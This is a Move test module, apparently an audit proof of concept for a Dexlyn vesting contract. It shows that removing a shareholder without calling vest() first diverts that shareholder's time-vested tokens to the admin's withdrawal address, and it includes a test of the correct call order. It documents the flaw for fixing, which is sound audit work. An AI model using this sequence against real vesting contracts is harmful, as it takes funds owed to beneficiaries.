#[test_only]
module dexlyn_tokenomics::finding_16_poc {
    use std::signer::address_of;
    use std::vector;
    use dexlyn_coin::dxlyn_coin;
    use supra_framework::account;
    use supra_framework::genesis;
    use supra_framework::primary_fungible_store;
    use supra_framework::timestamp;
    use dexlyn_tokenomics::test_internal_coins;
    use dexlyn_tokenomics::vesting;

    const GRANT_AMOUNT: u64 = 10000;
    const DXLYN_DECIMAL: u64 = 100000000;
    const MONTH_IN_SECONDS: u64 = 30 * 24 * 60 * 60;

    fun get_quants(amt: u64): u64 {
        amt * DXLYN_DECIMAL
    }

    fun setup(deployer: &signer) {
        genesis::setup();
        timestamp::update_global_time_for_test_secs(1000);
        test_internal_coins::init_coin(deployer);
        vesting::test_init(deployer);

        let contribute_amount = get_quants(10000);
        dxlyn_coin::mint(deployer, address_of(deployer), contribute_amount);
        vesting::contribute(deployer, contribute_amount);
    }

    fun create_test_account(accounts: vector<address>) {
        vector::for_each_ref(
            &accounts,
            |addr| {
                if (!account::exists_at(*addr)) {
                    account::create_account_for_test(*addr);
                }
            }
        )
    }

    /// POC: Demonstrate that remove_shareholder WITHOUT calling vest first
    /// allows admin to withdraw time-vested-but-unclaimed tokens
    #[test(dev = @dexlyn_tokenomics)]
    fun test_remove_shareholder_steals_vested_tokens(dev: &signer) {
        setup(dev);

        let alice_addr = @0xA11CE;
        let withdrawal_addr = @0xAD111;

        create_test_account(vector[alice_addr, withdrawal_addr]);

        // Create vesting contract: 1000 DXLYN over 10 periods (100 DXLYN per period)
        let current_time = timestamp::now_seconds();
        let total_amount = get_quants(1000);

        let contract_addr = vesting::schedule_vesting_contract(
            dev,
            vector[alice_addr],
            vector[total_amount],
            vector[10],  // 10 periods = 10% per period
            100,         // cliff = 100
            current_time,
            MONTH_IN_SECONDS,  // period duration = 1 month
            withdrawal_addr
        );

        let metadata = dxlyn_coin::get_dxlyn_asset_metadata();

        // STEP 1: Fast forward 3 months (3 periods)
        // At this point, 300 DXLYN should be vested by time
        timestamp::fast_forward_seconds(3 * MONTH_IN_SECONDS);

        // STEP 2: Get Alice's vesting record BEFORE any vest call
        let (init_amount, left_amount_before, _) =
            vesting::get_shareholder_vesting_record(contract_addr, alice_addr);

        // Alice's balance before - should be 0 since vest() hasn't been called
        let alice_balance_before = primary_fungible_store::balance(alice_addr, metadata);

        // Withdrawal address balance before
        let withdrawal_balance_before = primary_fungible_store::balance(withdrawal_addr, metadata);

        // CRITICAL: Remove shareholder WITHOUT calling vest() first
        // This is the vulnerability - admin removes Alice without settling her vested tokens
        vesting::remove_shareholder(dev, contract_addr, alice_addr);

        // STEP 3: Verify the exploit
        let alice_balance_after = primary_fungible_store::balance(alice_addr, metadata);
        let withdrawal_balance_after = primary_fungible_store::balance(withdrawal_addr, metadata);

        // Calculate actual amounts
        let alice_received = alice_balance_after - alice_balance_before;
        let withdrawal_received = withdrawal_balance_after - withdrawal_balance_before;

        // VERIFICATION:
        // 1. Alice should have received 0 tokens (because vest() was never called)
        assert!(alice_received == 0, 1001);

        // 2. Withdrawal address should have received ALL left_amount
        // This includes the 300 DXLYN that should have been Alice's
        assert!(withdrawal_received == left_amount_before, 1002);

        // 3. left_amount_before should equal init_amount (no vesting occurred)
        assert!(left_amount_before == init_amount, 1003);

        // 4. Calculate the loss: 3 periods vested out of 10 total
        // Expected vested: 30% of total = 300 DXLYN (approximately)
        let expected_vested_amount = (init_amount * 30) / 100;

        // The loss is approximately the vested amount that Alice should have received
        // but was instead withdrawn by admin
        let alice_loss = expected_vested_amount;

        // Assert that Alice lost a significant amount (at least 25% of total to account for precision)
        assert!(alice_loss > (init_amount * 25) / 100, 1004);

        // CONCLUSION: This POC proves that:
        // - Alice had 300 DXLYN vested by time (3 periods passed)
        // - Admin called remove_shareholder WITHOUT calling vest() first
        // - Withdrawal address received ALL 1000 DXLYN including Alice's 300 vested tokens
        // - Alice received 0 tokens, losing her time-vested amount
    }

    /// COMPARISON: Demonstrate the CORRECT behavior when vest() is called first
    #[test(dev = @dexlyn_tokenomics)]
    fun test_remove_shareholder_correct_usage(dev: &signer) {
        setup(dev);

        let alice_addr = @0xA11CE;
        let withdrawal_addr = @0xAD111;

        create_test_account(vector[alice_addr, withdrawal_addr]);

        // Same setup as exploit POC
        let current_time = timestamp::now_seconds();
        let total_amount = get_quants(1000);

        let contract_addr = vesting::schedule_vesting_contract(
            dev,
            vector[alice_addr],
            vector[total_amount],
            vector[10],
            100,
            current_time,
            MONTH_IN_SECONDS,
            withdrawal_addr
        );

        let metadata = dxlyn_coin::get_dxlyn_asset_metadata();

        // Fast forward 3 months
        timestamp::fast_forward_seconds(3 * MONTH_IN_SECONDS);

        let alice_balance_before = primary_fungible_store::balance(alice_addr, metadata);
        let withdrawal_balance_before = primary_fungible_store::balance(withdrawal_addr, metadata);

        // CORRECT APPROACH: Call vest() BEFORE remove_shareholder
        vesting::vest(contract_addr);

        // Get remaining amount after vesting
        let (_, remaining_amount, _) =
            vesting::get_shareholder_vesting_record(contract_addr, alice_addr);

        // Now remove shareholder
        vesting::remove_shareholder(dev, contract_addr, alice_addr);

        let alice_balance_after = primary_fungible_store::balance(alice_addr, metadata);
        let withdrawal_balance_after = primary_fungible_store::balance(withdrawal_addr, metadata);

        let alice_received = alice_balance_after - alice_balance_before;
        let withdrawal_received = withdrawal_balance_after - withdrawal_balance_before;

        // VERIFICATION:
        // 1. Alice should have received her vested amount (approximately 30% with precision loss)
        let expected_min_vested = (total_amount * 25) / 100;  // At least 25% accounting for precision
        assert!(alice_received >= expected_min_vested, 2001);

        // 2. Withdrawal should have received only the REMAINING (unvested) amount
        assert!(withdrawal_received == remaining_amount, 2002);

        // 3. The remaining amount should be less than total (vested portion was transferred to Alice)
        assert!(remaining_amount < total_amount, 2003);

        // CONCLUSION: When vest() is called first:
        // - Alice receives her time-vested tokens (~300 DXLYN)
        // - Withdrawal address receives only the unvested remainder (~700 DXLYN)
        // - No loss occurs
    }

    /// EXPLOIT SCENARIO: Demonstrate economic impact with realistic numbers
    #[test(dev = @dexlyn_tokenomics)]
    fun test_exploit_economic_analysis(dev: &signer) {
        setup(dev);

        let alice_addr = @0xA11CE;
        let withdrawal_addr = @0xAD111;

        create_test_account(vector[alice_addr, withdrawal_addr]);

        // Realistic scenario: 1-year vesting, 1,200 DXLYN tokens
        // 12 monthly periods, 100 DXLYN per month
        let current_time = timestamp::now_seconds();
        let total_amount = get_quants(1200);

        let contract_addr = vesting::schedule_vesting_contract(
            dev,
            vector[alice_addr],
            vector[total_amount],
            vector[12],  // 12 periods
            100,
            current_time,
            MONTH_IN_SECONDS,
            withdrawal_addr
        );

        let metadata = dxlyn_coin::get_dxlyn_asset_metadata();

        // Fast forward 6 months - Alice has worked for 6 months
        timestamp::fast_forward_seconds(6 * MONTH_IN_SECONDS);

        let (init_amount, left_amount, _) =
            vesting::get_shareholder_vesting_record(contract_addr, alice_addr);

        let alice_balance_before = primary_fungible_store::balance(alice_addr, metadata);
        let withdrawal_balance_before = primary_fungible_store::balance(withdrawal_addr, metadata);

        // Admin removes Alice without settling vested tokens
        vesting::remove_shareholder(dev, contract_addr, alice_addr);

        let alice_balance_after = primary_fungible_store::balance(alice_addr, metadata);
        let withdrawal_balance_after = primary_fungible_store::balance(withdrawal_addr, metadata);

        let alice_loss = alice_balance_after - alice_balance_before;
        let admin_gain = withdrawal_balance_after - withdrawal_balance_before;

        // ECONOMIC ANALYSIS:
        // 1. Alice worked for 6 months out of 12 total
        // 2. Should have received 50% of 1,200 = 600 DXLYN
        // 3. Instead received 0 DXLYN
        // 4. Admin withdrew all 1,200 DXLYN

        assert!(alice_loss == 0, 3001);
        assert!(admin_gain == init_amount, 3002);
        assert!(left_amount == init_amount, 3003);

        // Expected loss calculation: 50% of total allocation
        let expected_vested_percentage = 50;
        let expected_loss = (init_amount * expected_vested_percentage) / 100;

        // Alice's loss is approximately 600 DXLYN (accounting for precision)
        let loss_percentage = ((expected_loss * 100) / init_amount);
        assert!(loss_percentage >= 45, 3004);  // At least 45% loss accounting for precision

        // CONCLUSION: In a realistic scenario with 6 months vested:
        // - Alice loses approximately 600 DXLYN (50% of allocation)
        // - Admin gains the full 1,200 DXLYN
        // - This represents complete theft of time-vested tokens
    }
}
